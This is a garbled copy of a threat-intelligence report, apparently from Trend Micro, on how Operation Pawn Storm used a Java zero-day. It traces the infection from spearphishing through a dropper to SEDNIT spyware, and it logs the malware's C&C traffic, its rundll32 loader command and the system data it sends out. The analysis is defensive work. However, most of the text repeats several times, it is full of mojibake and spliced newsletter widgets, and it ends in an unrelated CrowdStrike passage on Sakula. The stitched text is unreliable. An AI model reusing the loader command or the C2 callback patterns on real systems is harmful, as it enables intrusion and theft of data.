This type of behavior and activity is expected to continue for the near future due to the multiple vulnerabilities disclosed by the Hacking Team data breach . As with many other previously disclosed advanced attacks , relying purely on a detection - based model for security is ineffective when IOCs are either unknown or are not readily available for ingestion . Thus , it is imperative that organizations deploy automated , behavior - based preventative measures such as Palo Alto Networks WildFire or Traps to reduce the risk of unknown attacks .

Over the past year or so , we have seen numerous techniques and tactics employed by this campaign , such as the use of an iOS espionage app , and the inclusion of new targets like the White House . Through our on - going investigation and monitoring of this targeted attack campaign , we found suspicious URLs that hosted a newly discovered zero - day exploit in Java now identified by Oracle as CVE-2015 - 2590 . This is the first time in nearly two years that a new Java zero - day vulnerability was reported . The report below outlines the traffic observed as part of the attack , not the exploit itself . Our blog entry on how the exploit itself works can be found here . This blog entry is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred . We strongly recommend that all readers roll out the Oracle patch as soon as possible Infection sequence Trend Micro has observed that an entity belonging to the target profile received an email that contains the following URL : hxxp://ausameetings[.]com / url?={BLOCKED}/2015annualmeeting/ It is worth noting that the spearphishing domain used is ausameetings[.]com , a play on the valid domain â€ausameetings.org , â€ which is a site forAUSAâ€ ™ s ( Association of the United StatesArmy ) annual exposition , commonly held in mid - October . The domain was only registered last July 8 , which implies a one - time use for a specific set of targets . When assessing this URL , it was determined that the most probable infection sequence is : Figure 1 . Infection chain Like all multi - stage infections , a successful execution of the previous stage is required before moving to the next stage down . In Stage 1 , the sequence is initiated by clicking on the URLembedded within the victimâ€ ™ s spearphishing email . Once the Java exploit of Stage 1 is successful , it downloads the PE file ( Stage 2 ) . Once the PE file is downloaded and executed it drops and runs the DLLfile ( Stage 3 ) which is the final component to infect the machine with SEDNIT . The information that we have on each of these steps is as follows . Further information on each of these stages can be found in the sections below .

Send an encoded POST call , which , when decoded , is the variable to construct the subsequently used URI path . This is particularly interesting as it appears that each URI path on the malicious server is customized by the victimâ€ ™ s infection , rather than static on the web server . 3 . The victim machine then does a variety of GET calls to pull down JPG , JNLP , and Java class files . 4 . If the Java class files can not be found on the primarily domain ( ausameetings[.]com ) , it appears to instead attempt to get these files from a hardcoded IP ( 87[.]236[.]215[.]132 ) . 5 . Once the class files are downloaded , the victim machine then does a GET call to fetch the file cormac.mcr . This file is the PE file for Stage 2 .

Figure 2 . Traffic patterns ( click the image to enlarge ) One can observe that the second call sends a POST to ausumeetings[.]com , and is returned with a text responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests . Stage 2 â€ “ The PE file Stage 2 involves downloading a PE file . Trend Micro detects this file as TROJ_DROPPR.CXC . The primary purpose of this PE is to drop and load the DLLexecutable . It is downloaded as Cormac.mcr , but once extracted , the file name is converted into a randomized file name . It is installed into the % USERPROFILE% directory and then executed , creating a service by the same name . During its installation , a variety of other services also appear to be hooked , including lsass , lsm , and conhost , amongst others . Figure 3 . Observed processes ( click the image to enlarge ) Once the malware is executed , it will drop the Stage 3 DLLfile with filename api - ms - win - downlevelprofile- l1-1-0.dll in the % TEMP% directory . To load the malware , it executes rundll32.exe using the following command : rundll32.exe â€%temp%/api - ms - win - downlevel - profile - l1 - 1 - 0.dllâ€,init Stage 3 â€ “ The DLL file This third stage involves a DLLfile , which we detect as TSPY_SEDNIT.C. When the PE file triggers the DLL(in this instance , % windir%\system32\RunDll32.exe Command : â€%windir%\system32\RunDll32.exe â€ â€C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\ap i - ms - windownlevel- profile - l1 - 1 - 0.dllâ€,init ) , the following traffic was observed . 1 POST /ESL / YxF8bM / f / MFS.pdf/?duJ = OJYKZRlzy1tddcpaKjU= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 2 POST /RGLw / ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 830 3 POST /hP / Bo / S/2z.htm/?WDC = TJrXZm1 / FlgpeRdZXjk= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 4 POST /C9zl / LJ9.zip/?hP = mLgAZ7ldwVn9W8BYihs= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 0 5 POST /k9 / eR3 / a / UE / eR.pdf/?bKC = xCCmnuXFZ6Chw2ah1oM= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 26 It bears stressing that we do not encourage using the data presented above as IOCs for your own analysis . The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the creation of URI paths utilized to pull down files . After assessing the samples multiple times , each network traffic infection sequence appeared to be different , no matter what sequence of testing was performed ( e.g. , same machine , different machines , different geographic IP space globally , etc . ) . After detailed network forensics of the traffic , it was determined that no single stable URLpath or URI query component ( URI path component , file name , or URI query parameter ) showed a consistent pattern ( either same entry nor regex definable pattern ) , and further reverse engineering was required to determine the methods used to achieve this . As a result of this additional analysis , it was determined that the URI path is a random generated string with the following pattern : ^/([a - zA - Z0 - 9]{1,6}/){1,5}[a - zA - Z0 - 9]{1,7}\.(xml|pdf|htm|zip)/\?[a - zA - Z0 - 9]{1,3}=<Encoded ID > Figure 4 . Regex expression Included in the POST request is a data encoded with Base64 and XOR encryption . The encoded data contains the following system information of the infected machine : OS Version List of running processes Hard Disk Drive Information Volume Serial Number TSPY_SEDNIT.C connects to three C&C servers : 192[.]111[.]146[.]185 ( direct to IP call ) www[.]acledit[.]com www[.]biocpl[.]org After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above .

Through our on - going investigation and monitoring of this targeted attack campaign , we found suspicious URLs that hosted a newly discovered zero - day exploit in Java now identified by Oracle as CVE-2015 - 2590 . This is the first time in nearly two years that a new Java zero - day vulnerability was reported . The report below outlines the traffic observed as part of the attack , not the exploit itself . Our blog entry on how the exploit itself works can be found here . This blog entry is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred . We strongly recommend that all readers roll out the Oracle patch as soon as possible Infection sequence Trend Micro has observed that an entity belonging to the target profile received an email that contains the following URL : hxxp://ausameetings[.]com / url?={BLOCKED}/2015annualmeeting/ It is worth noting that the spearphishing domain used is ausameetings[.]com , a play on the valid domain â€ausameetings.org , â€ which is a site forAUSAâ€ ™ s ( Association of the United StatesArmy ) annual exposition , commonly held in mid - October . The domain was only registered last July 8 , which implies a one - time use for a specific set of targets . When assessing this URL , it was determined that the most probable infection sequence is : Figure 1 . Infection chain Like all multi - stage infections , a successful execution of the previous stage is required before moving to the next stage down . In Stage 1 , the sequence is initiated by clicking on the URLembedded within the victimâ€ ™ s spearphishing email . Once the Java exploit of Stage 1 is successful , it downloads the PE file ( Stage 2 ) . Once the PE file is downloaded and executed it drops and runs the DLLfile ( Stage 3 ) which is the final component to infect the machine with SEDNIT . The information that we have on each of these steps is as follows . Further information on each of these stages can be found in the sections below .

We dressed up # threats as # Halloween bit.ly/20fiz2c # infosec Stage 1 â€ “ the Java exploit The first stage of the infection sequence comes through a targeted , spearphishing attempt against the victim , which is the observed method for Operation Pawn Storm attacks . The initial spearphishing URLis constructed similar to : hxxp://ausameetings[.]com / url?=[a - zA - Z0 - 9]{7}/2015annualmeeting/ The web pages on this domain that were found to drop the Java zero - day exploit include : about 12 hours ago 1_2015annualmeeting index.htm ( 19,225 bytes ) â€ “ detected as HTML_JNLPER.HAQ 3_544306 index.htm ( 4,077 bytes ) â€ “ detected as HTML_JNLPER.HAQ The network traffic observed for the infection sequence of this stage is : StayUpdated 1 . Send the initial POST as per the spearphishing email to ausameetings[.]com , which includes the Email Subscription 2015annualmeeting URI path . Your email here 2 . Send an encoded POST call , which , when decoded , is the variable to construct the subsequently used URI path . This is particularly interesting as it appears that each URI path on the malicious server is customized by the victimâ€ ™ s infection , rather than static on the web server . 3 . The victim machine then does a variety of GET calls to pull down JPG , JNLP , and Java class files . 4 . If the Java class files can not be found on the primarily domain ( ausameetings[.]com ) , it appears to instead attempt to get these files from a hardcoded IP ( 87[.]236[.]215[.]132 ) . 5 . Once the class files are downloaded , the victim machine then does a GET call to fetch the file cormac.mcr . This file is the PE file for Stage 2 . For completeness , the specific traffic calls observed relating to Stage 1 include the following : e b i r ubsc S Result Protocol Host URL Size Content - Type 200 HTTP ausameetings[.]com /url?={BLOCKED}/2015annualmeeting/ 19,225 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /VFlmsRH/7311/4388/558923/ ? p2 = KlW2HlMf&c= BMjNiBV&recr = Wr1mI7&p3=364397021 & as = SAUmj&c = GY9oCdQ & 22 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036/ 4,077 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / line.jpg 22,500 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / right.jpg 97,247 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / init.jnlp 562 application / xjava- jnlp - file 200 HTTP ausameetings[.]com /url/544036/ 4,077 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / jndi.properties 125 text / html ; charset = utf-8 404 HTTP ausameetings[.]com /url/544036 / Go.class 0 text / html ; charset = utf-8 Result Protocol Host URL Size Content - Type 200 HTTP 87[.]236[.]215[.]132 /2 / Go.class 1,373 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /crossdomain.xml 0 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / App.class 7,552 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / Help.class 5,667 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / PhantomSuper.class 763 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / ArrayReplace.class 729 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / App$PassHandleController.class 980 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / Converter.class 2,820 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / MyByteArrayInputStream.class 1,282 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /2 / pkg / None2.class 0 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /2 / pkg / None.class 0 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / cormac.mcr 1,619,968 application / octetstream Trend Micro detects these Java class files as JAVA_DLOADR.EFD : App.class ( 7,552 bytes ) Go.class ( 1,373 bytes ) Help.class ( 5,667 bytes ) The second and third traffic calls in the traffic pattern are particularly interesting to note . Figure 2 . Traffic patterns ( click the image to enlarge ) One can observe that the second call sends a POST to ausumeetings[.]com , and is returned with a text responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests . Stage 2 â€ “ The PE file Stage 2 involves downloading a PE file . Trend Micro detects this file as TROJ_DROPPR.CXC . The primary purpose of this PE is to drop and load the DLLexecutable . It is downloaded as Cormac.mcr , but once extracted , the file name is converted into a randomized file name . It is installed into the % USERPROFILE% directory and then executed , creating a service by the same name . During its installation , a variety of other services also appear to be hooked , including lsass , lsm , and conhost , amongst others . Figure 3 . Observed processes ( click the image to enlarge ) Once the malware is executed , it will drop the Stage 3 DLLfile with filename api - ms - win - downlevelprofile- l1-1-0.dll in the % TEMP% directory . To load the malware , it executes rundll32.exe using the following command : rundll32.exe â€%temp%/api - ms - win - downlevel - profile - l1 - 1 - 0.dllâ€,init Stage 3 â€ “ The DLL file This third stage involves a DLLfile , which we detect as TSPY_SEDNIT.C. When the PE file triggers the DLL(in this instance , % windir%\system32\RunDll32.exe Command : â€%windir%\system32\RunDll32.exe â€ â€C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\ap i - ms - windownlevel- profile - l1 - 1 - 0.dllâ€,init ) , the following traffic was observed . 1 POST /ESL / YxF8bM / f / MFS.pdf/?duJ = OJYKZRlzy1tddcpaKjU= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 2 POST /RGLw / ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 830 3 POST /hP / Bo / S/2z.htm/?WDC = TJrXZm1 / FlgpeRdZXjk= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 4 POST /C9zl / LJ9.zip/?hP = mLgAZ7ldwVn9W8BYihs= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 0 5 POST /k9 / eR3 / a / UE / eR.pdf/?bKC = xCCmnuXFZ6Chw2ah1oM= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 26 It bears stressing that we do not encourage using the data presented above as IOCs for your own analysis . The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the creation of URI paths utilized to pull down files . After assessing the samples multiple times , each network traffic infection sequence appeared to be different , no matter what sequence of testing was performed ( e.g. , same machine , different machines , different geographic IP space globally , etc . ) . After detailed network forensics of the traffic , it was determined that no single stable URLpath or URI query component ( URI path component , file name , or URI query parameter ) showed a consistent pattern ( either same entry nor regex definable pattern ) , and further reverse engineering was required to determine the methods used to achieve this . As a result of this additional analysis , it was determined that the URI path is a random generated string with the following pattern : ^/([a - zA - Z0 - 9]{1,6}/){1,5}[a - zA - Z0 - 9]{1,7}\.(xml|pdf|htm|zip)/\?[a - zA - Z0 - 9]{1,3}=<Encoded ID > Figure 4 . Regex expression Included in the POST request is a data encoded with Base64 and XOR encryption . The encoded data contains the following system information of the infected machine : OS Version List of running processes Hard Disk Drive Information Volume Serial Number TSPY_SEDNIT.C connects to three C&C servers : 192[.]111[.]146[.]185 ( direct to IP call ) www[.]acledit[.]com www[.]biocpl[.]org After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above . Phase 2 of the attack : the keystroke logger Based on our investigation of Operation Pawn Storm , we know that the infection happens in two stages : In phase 1 , opening the email attachment or clicking on the malicious URI initiates the download of the first level dropper , which installs the downloader component ( .DLLfile ) .

Over the past year or so , we have seen numerous techniques and tactics employed by this campaign , such as the use of an iOS espionage app , and the inclusion of new targets like the White House . Through our on - going investigation and monitoring of this targeted attack campaign , we found suspicious URLs that hosted a newly discovered zero - day exploit in Java now identified by Oracle as CVE-2015 - 2590 . This is the first time in nearly two years that a new Java zero - day vulnerability was reported . The report below outlines the traffic observed as part of the attack , not the exploit itself . Our blog entry on how the exploit itself works can be found here . This blog entry is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred . We strongly recommend that all readers roll out the Oracle patch as soon as possible Infection sequence Trend Micro has observed that an entity belonging to the target profile received an email that contains the following URL : hxxp://ausameetings[.]com / url?={BLOCKED}/2015annualmeeting/ It is worth noting that the spearphishing domain used is ausameetings[.]com , a play on the valid domain â€ausameetings.org , â€ which is a site forAUSAâ€ ™ s ( Association of the United StatesArmy ) annual exposition , commonly held in mid - October . The domain was only registered last July 8 , which implies a one - time use for a specific set of targets . When assessing this URL , it was determined that the most probable infection sequence is : Figure 1 . Infection chain Like all multi - stage infections , a successful execution of the previous stage is required before moving to the next stage down . In Stage 1 , the sequence is initiated by clicking on the URLembedded within the victimâ€ ™ s spearphishing email . Once the Java exploit of Stage 1 is successful , it downloads the PE file ( Stage 2 ) . Once the PE file is downloaded and executed it drops and runs the DLLfile ( Stage 3 ) which is the final component to infect the machine with SEDNIT . The information that we have on each of these steps is as follows . Further information on each of these stages can be found in the sections below .

We dressed up # threats as # Halloween bit.ly/20fiz2c # infosec Stage 1 â€ “ the Java exploit The first stage of the infection sequence comes through a targeted , spearphishing attempt against the victim , which is the observed method for Operation Pawn Storm attacks . The initial spearphishing URLis constructed similar to : hxxp://ausameetings[.]com / url?=[a - zA - Z0 - 9]{7}/2015annualmeeting/ The web pages on this domain that were found to drop the Java zero - day exploit include : about 12 hours ago 1_2015annualmeeting index.htm ( 19,225 bytes ) â€ “ detected as HTML_JNLPER.HAQ 3_544306 index.htm ( 4,077 bytes ) â€ “ detected as HTML_JNLPER.HAQ The network traffic observed for the infection sequence of this stage is : StayUpdated 1 . Send the initial POST as per the spearphishing email to ausameetings[.]com , which includes the Email Subscription 2015annualmeeting URI path . Your email here 2 . Send an encoded POST call , which , when decoded , is the variable to construct the subsequently used URI path . This is particularly interesting as it appears that each URI path on the malicious server is customized by the victimâ€ ™ s infection , rather than static on the web server . 3 . The victim machine then does a variety of GET calls to pull down JPG , JNLP , and Java class files . 4 . If the Java class files can not be found on the primarily domain ( ausameetings[.]com ) , it appears to instead attempt to get these files from a hardcoded IP ( 87[.]236[.]215[.]132 ) . 5 . Once the class files are downloaded , the victim machine then does a GET call to fetch the file cormac.mcr . This file is the PE file for Stage 2 .

Figure 2 . Traffic patterns ( click the image to enlarge ) One can observe that the second call sends a POST to ausumeetings[.]com , and is returned with a text responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests . Stage 2 â€ “ The PE file Stage 2 involves downloading a PE file . Trend Micro detects this file as TROJ_DROPPR.CXC . The primary purpose of this PE is to drop and load the DLLexecutable . It is downloaded as Cormac.mcr , but once extracted , the file name is converted into a randomized file name . It is installed into the % USERPROFILE% directory and then executed , creating a service by the same name . During its installation , a variety of other services also appear to be hooked , including lsass , lsm , and conhost , amongst others . Figure 3 .

The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the creation of URI paths utilized to pull down files . After assessing the samples multiple times , each network traffic infection sequence appeared to be different , no matter what sequence of testing was performed ( e.g. , same machine , different machines , different geographic IP space globally , etc . ) . After detailed network forensics of the traffic , it was determined that no single stable URLpath or URI query component ( URI path component , file name , or URI query parameter ) showed a consistent pattern ( either same entry nor regex definable pattern ) , and further reverse engineering was required to determine the methods used to achieve this . As a result of this additional analysis , it was determined that the URI path is a random generated string with the following pattern : ^/([a - zA - Z0 - 9]{1,6}/){1,5}[a - zA - Z0 - 9]{1,7}\.(xml|pdf|htm|zip)/\?[a - zA - Z0 - 9]{1,3}=<Encoded ID > Figure 4 . Regex expression Included in the POST request is a data encoded with Base64 and XOR encryption . The encoded data contains the following system information of the infected machine : OS Version List of running processes Hard Disk Drive Information Volume Serial Number TSPY_SEDNIT.C connects to three C&C servers : 192[.]111[.]146[.]185 ( direct to IP call ) www[.]acledit[.]com www[.]biocpl[.]org After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above . Phase 2 of the attack : the keystroke logger Based on our investigation of Operation Pawn Storm , we know that the infection happens in two stages : In phase 1 , opening the email attachment or clicking on the malicious URI initiates the download of the first level dropper , which installs the downloader component ( .DLLfile ) . In phase 2 , the downloader component communicates with a C&C server and downloads other components , and at the end of the chain a keylogger is installer . The keylogger sends data back to the C&C server . As of writing , we have not succeeded in triggering Phase 2 , which will download a fourth stage malware from the C&C servers . "

"an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used","usesaddress","Operation  Pawn  Storm","FAC","2","CARDINAL","Operation Pawn Storm have been active since at least 2007 and they continue to launch new campaigns . Over the past year or so , we have seen numerous techniques and tactics employed by this campaign , such as the use of an iOS espionage app , and the inclusion of new targets like the White House . Through our on - going investigation and monitoring of this targeted attack campaign , we found suspicious URLs that hosted a newly discovered zero - day exploit in Java now identified by Oracle as CVE-2015 - 2590 . This is the first time in nearly two years that a new Java zero - day vulnerability was reported . The report below outlines the traffic observed as part of the attack , not the exploit itself . Our blog entry on how the exploit itself works can be found here . This blog entry is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred . We strongly recommend that all readers roll out the Oracle patch as soon as possible Infection sequence Trend Micro has observed that an entity belonging to the target profile received an email that contains the following URL : hxxp://ausameetings[.]com / url?={BLOCKED}/2015annualmeeting/ It is worth noting that the spearphishing domain used is ausameetings[.]com , a play on the valid domain â€ausameetings.org , â€ which is a site forAUSAâ€ ™ s ( Association of the United StatesArmy ) annual exposition , commonly held in mid - October . The domain was only registered last July 8 , which implies a one - time use for a specific set of targets . When assessing this URL , it was determined that the most probable infection sequence is : Figure 1 . Infection chain Like all multi - stage infections , a successful execution of the previous stage is required before moving to the next stage down . In Stage 1 , the sequence is initiated by clicking on the URLembedded within the victimâ€ ™ s spearphishing email . Once the Java exploit of Stage 1 is successful , it downloads the PE file ( Stage 2 ) . Once the PE file is downloaded and executed it drops and runs the DLLfile ( Stage 3 ) which is the final component to infect the machine with SEDNIT . The information that we have on each of these steps is as follows . Further information on each of these stages can be found in the sections below .

We dressed up # threats as # Halloween bit.ly/20fiz2c # infosec Stage 1 â€ “ the Java exploit The first stage of the infection sequence comes through a targeted , spearphishing attempt against the victim , which is the observed method for Operation Pawn Storm attacks . The initial spearphishing URLis constructed similar to : hxxp://ausameetings[.]com / url?=[a - zA - Z0 - 9]{7}/2015annualmeeting/ The web pages on this domain that were found to drop the Java zero - day exploit include : about 12 hours ago 1_2015annualmeeting index.htm ( 19,225 bytes ) â€ “ detected as HTML_JNLPER.HAQ 3_544306 index.htm ( 4,077 bytes ) â€ “ detected as HTML_JNLPER.HAQ The network traffic observed for the infection sequence of this stage is : StayUpdated 1 . Send the initial POST as per the spearphishing email to ausameetings[.]com , which includes the Email Subscription 2015annualmeeting URI path . Your email here 2 . Send an encoded POST call , which , when decoded , is the variable to construct the subsequently used URI path . This is particularly interesting as it appears that each URI path on the malicious server is customized by the victimâ€ ™ s infection , rather than static on the web server . 3 . The victim machine then does a variety of GET calls to pull down JPG , JNLP , and Java class files . 4 . If the Java class files can not be found on the primarily domain ( ausameetings[.]com ) , it appears to instead attempt to get these files from a hardcoded IP ( 87[.]236[.]215[.]132 ) . 5 . Once the class files are downloaded , the victim machine then does a GET call to fetch the file cormac.mcr . This file is the PE file for Stage 2 . For completeness , the specific traffic calls observed relating to Stage 1 include the following : e b i r ubsc S Result Protocol Host URL Size Content - Type 200 HTTP ausameetings[.]com /url?={BLOCKED}/2015annualmeeting/ 19,225 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /VFlmsRH/7311/4388/558923/ ? p2 = KlW2HlMf&c= BMjNiBV&recr = Wr1mI7&p3=364397021 & as = SAUmj&c = GY9oCdQ & 22 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036/ 4,077 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / line.jpg 22,500 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / right.jpg 97,247 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / init.jnlp 562 application / xjava- jnlp - file 200 HTTP ausameetings[.]com /url/544036/ 4,077 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / jndi.properties 125 text / html ; charset = utf-8 404 HTTP ausameetings[.]com /url/544036 / Go.class 0 text / html ; charset = utf-8 Result Protocol Host URL Size Content - Type 200 HTTP 87[.]236[.]215[.]132 /2 / Go.class 1,373 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /crossdomain.xml 0 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / App.class 7,552 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / Help.class 5,667 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / PhantomSuper.class 763 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / ArrayReplace.class 729 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / App$PassHandleController.class 980 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / Converter.class 2,820 text / html ; charset = utf-8 200 HTTP 87[.]236[.]215[.]132 /2 / MyByteArrayInputStream.class 1,282 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /2 / pkg / None2.class 0 text / html ; charset = utf-8 404 HTTP 87[.]236[.]215[.]132 /2 / pkg / None.class 0 text / html ; charset = utf-8 200 HTTP ausameetings[.]com /url/544036 / cormac.mcr 1,619,968 application / octetstream Trend Micro detects these Java class files as JAVA_DLOADR.EFD : App.class ( 7,552 bytes ) Go.class ( 1,373 bytes ) Help.class ( 5,667 bytes ) The second and third traffic calls in the traffic pattern are particularly interesting to note . Figure 2 . Traffic patterns ( click the image to enlarge ) One can observe that the second call sends a POST to ausumeetings[.]com , and is returned with a text responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests . Stage 2 â€ “ The PE file Stage 2 involves downloading a PE file . Trend Micro detects this file as TROJ_DROPPR.CXC . The primary purpose of this PE is to drop and load the DLLexecutable . It is downloaded as Cormac.mcr , but once extracted , the file name is converted into a randomized file name . It is installed into the % USERPROFILE% directory and then executed , creating a service by the same name . During its installation , a variety of other services also appear to be hooked , including lsass , lsm , and conhost , amongst others . Figure 3 . Observed processes ( click the image to enlarge ) Once the malware is executed , it will drop the Stage 3 DLLfile with filename api - ms - win - downlevelprofile- l1-1-0.dll in the % TEMP% directory . To load the malware , it executes rundll32.exe using the following command : rundll32.exe â€%temp%/api - ms - win - downlevel - profile - l1 - 1 - 0.dllâ€,init Stage 3 â€ “ The DLL file This third stage involves a DLLfile , which we detect as TSPY_SEDNIT.C. When the PE file triggers the DLL(in this instance , % windir%\system32\RunDll32.exe Command : â€%windir%\system32\RunDll32.exe â€ â€C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\ap i - ms - windownlevel- profile - l1 - 1 - 0.dllâ€,init ) , the following traffic was observed . 1 POST /ESL / YxF8bM / f / MFS.pdf/?duJ = OJYKZRlzy1tddcpaKjU= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 2 POST /RGLw / ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 830 3 POST /hP / Bo / S/2z.htm/?WDC = TJrXZm1 / FlgpeRdZXjk= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : www.google.com Content - Length : 0 Note : Assumed to be a local connectivity test traffic call . 4 POST /C9zl / LJ9.zip/?hP = mLgAZ7ldwVn9W8BYihs= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 0 5 POST /k9 / eR3 / a / UE / eR.pdf/?bKC = xCCmnuXFZ6Chw2ah1oM= HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : 192[.]111[.]146[.]185 Content - Length : 26 It bears stressing that we do not encourage using the data presented above as IOCs for your own analysis . The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the creation of URI paths utilized to pull down files . After assessing the samples multiple times , each network traffic infection sequence appeared to be different , no matter what sequence of testing was performed ( e.g. , same machine , different machines , different geographic IP space globally , etc . ) . After detailed network forensics of the traffic , it was determined that no single stable URLpath or URI query component ( URI path component , file name , or URI query parameter ) showed a consistent pattern ( either same entry nor regex definable pattern ) , and further reverse engineering was required to determine the methods used to achieve this . As a result of this additional analysis , it was determined that the URI path is a random generated string with the following pattern : ^/([a - zA - Z0 - 9]{1,6}/){1,5}[a - zA - Z0 - 9]{1,7}\.(xml|pdf|htm|zip)/\?[a - zA - Z0 - 9]{1,3}=<Encoded ID > Figure 4 . Regex expression Included in the POST request is a data encoded with Base64 and XOR encryption . The encoded data contains the following system information of the infected machine : OS Version List of running processes Hard Disk Drive Information Volume Serial Number TSPY_SEDNIT.C connects to three C&C servers : 192[.]111[.]146[.]185 ( direct to IP call ) www[.]acledit[.]com www[.]biocpl[.]org After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above . Phase 2 of the attack : the keystroke logger Based on our investigation of Operation Pawn Storm , we know that the infection happens in two stages : In phase 1 , opening the email attachment or clicking on the malicious URI initiates the download of the first level dropper , which installs the downloader component ( .DLLfile ) . In phase 2 , the downloader component communicates with a C&C server and downloads other components , and at the end of the chain a keylogger is installer . "

Specifically , the known Sakula C2 domain webmail[.]vipreclod[.]com has shared infrastructureï¿½ with the Capstone Turbine - themed domain capstone[.]homeftp[.]net , suggesting that the same operators conducting the Capstone Turbine activity also used Sakula . This infrastructure has also been leveraged as C2 for PlugX samples . Furthermore , the Capstone Turbine - related infrastructure also includes multiple domains referencing â€GIFASâ€ which is the acronym for the French Aerospace Industries Association ( Groupement des industries franÃ§aises aÃ © ronautiques et spatiales ) . GIFAS - themed domains were also used in the February 2014 SWC activity . Conclusion The Sakula malware demonstrates the difficulty of attribution and the rationale for bookendingï¿½ technical information with analytic judgements . Sakula has relatively restricted deployments when compared to more widespread RATs used by China - based adversaries such as PlugX. Its use is linked to the use of a number of zero - day exploits and high - profile incidents such as thoseï¿½ resulting in the healthcare and government data breach notifications earlier this year . While itsï¿½ use is relatively limited , prolonged monitoring of Sakula activity leads the CrowdStrike Intelligence team to assess that it is likely used by a small subset of operators , which , given the access to zero - day exploits and high - profile operations , are likely well - resourced . ï¿½ For more information on the Sakula malware , feel free to contact us at intelligence@crowdstrike.com .
